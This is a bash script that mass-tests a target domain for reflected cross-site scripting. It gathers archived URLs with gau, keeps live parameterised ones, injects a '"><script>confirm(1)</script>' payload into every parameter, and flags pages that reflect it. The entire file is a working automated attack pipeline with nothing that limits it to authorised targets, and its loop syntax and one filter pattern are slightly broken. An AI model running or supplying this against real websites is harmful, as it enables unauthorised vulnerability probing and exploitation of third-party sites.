#!/bin/bash

gau $1 | httpx -status-code -silent -threads 500 | grep 200 | awk '{print $1}' | grep "=" | sed 's/=.*/=/'| grep -v ".jpg\|.jpeg\|.gif\|.css\|.tif\|.tiff\|.png|.ttf\|.woff\|.woff2\|.ico\|.pdf\|.woff2\|.svg\|.js" | qsreplace '"><script>confirm(1)</script>' | anew >> targeturls.txt && cat targeturls.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo -e "\e[31m[-] Vulnerable To Xss\e[0m : $host" || echo -e "\e[32m[+] Not Vulnerable To Xss\e[0m : $host";done | tee -a xss.txt; rm targeturls.txt; cat xss.txt | grep [-] >> xss_vuln.txt; cat xss.txt | grep [+] >> xss_non_vuln.txt; rm xss.txt; cat xss_vuln.txt | awk '{print $6}' >> xssurls.txt; /root/project_2/scripts/./xsshtml.sh xssurls.txt; rm xssurls.txt;
